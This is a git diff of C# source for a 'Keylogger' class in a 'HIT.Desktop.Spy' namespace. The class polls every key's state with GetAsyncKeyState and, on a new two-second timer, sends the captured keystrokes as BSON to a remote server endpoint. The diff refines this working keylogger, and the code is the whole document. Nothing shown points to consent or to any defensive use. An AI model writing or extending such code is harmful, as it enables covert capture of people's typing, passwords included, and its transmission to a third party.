@@ -7,6 +7,7 @@ using System.Net.Http.Headers;
 using System.Runtime.InteropServices;
 using System.Threading;
 using System.Threading.Tasks;
+using HIT.Web.Infrastructure.Extensions;
 using HIT.Web.ViewModels;
 
 namespace HIT.Desktop.Spy
@@ -19,30 +20,23 @@ namespace HIT.Desktop.Spy
         private readonly string SessionId;
         private bool isRunning;
         private List<string> keysPressedList;
+        private readonly Timer timer;
 
         public Keylogger(string sessionId)
         {
             this.SessionId = sessionId;
             this.isRunning = true;
             this.keysPressedList = new List<string>();
+
+            var dueTime = 2000;
+            var period = 2000;
+            this.timer = new Timer(async (obj) => { await this.TimerEventHandler(); }, null, dueTime, period);
         }
 
         public Task Start()
         {
             while (this.isRunning)
             {
-                // Think about this block of code
-                if (this.keysPressedList.Count > 10)
-                {
-                    var keysToSend = this.keysPressedList.ToList();
-                    this.SendKeysPressedAsync(keysToSend);
-                    this.keysPressedList.Clear();
-                }
-                else
-                {
-                    Thread.Sleep(10);
-                }
-
                 for (Int32 i = 0; i < 255; i++)
                 {
                     var keyState = GetAsyncKeyState(i);
@@ -57,6 +51,8 @@ namespace HIT.Desktop.Spy
                         }
                     }
                 }
+
+                Thread.Sleep(10);
             }
 
             return null;
@@ -66,6 +62,38 @@ namespace HIT.Desktop.Spy
         {
             this.isRunning = false;
             await this.SendKeysPressedAsync(this.keysPressedList);
+        }
+
+        private IList<string> GetDeepCopy(IList<string> list)
+        {
+            var clonedList = new List<string>(list.Count);
+
+            for (int i = 0; i < list.Count; i++)
+            {
+                var clonedItem = String.Copy(list[i]);
+                clonedList.Add(clonedItem);
+            }
+
+            return clonedList;
+        }
+
+        private async Task TimerEventHandler()
+        {
+            if (this.keysPressedList.IsNotNull() && this.keysPressedList.Count > 0)
+            {
+                var keysToSend = this.GetDeepCopy(this.keysPressedList);
+                this.keysPressedList.Clear();
+
+                // REDO THIS CODE, doesnt throw exception, must check what happends
+                try
+                {
+                    await this.SendKeysPressedAsync(keysToSend);
+                }
+                catch (Exception e)
+                {
+                    throw;
+                }
+            }
         }
 
         private async Task SendKeysPressedAsync(IList<string> data)
@@ -89,7 +117,7 @@ namespace HIT.Desktop.Spy
 
                 // POST using the BSON formatter
                 var bsonFormatter = new BsonMediaTypeFormatter();
-                var result = await client.PostAsync("api/Sessions/ReceiveKeysPressed", model, bsonFormatter);
+                var result = await client.PostAsync("api/Sessions/PostKeysPressed", model, bsonFormatter);
 
                 result.EnsureSuccessStatusCode();
             }
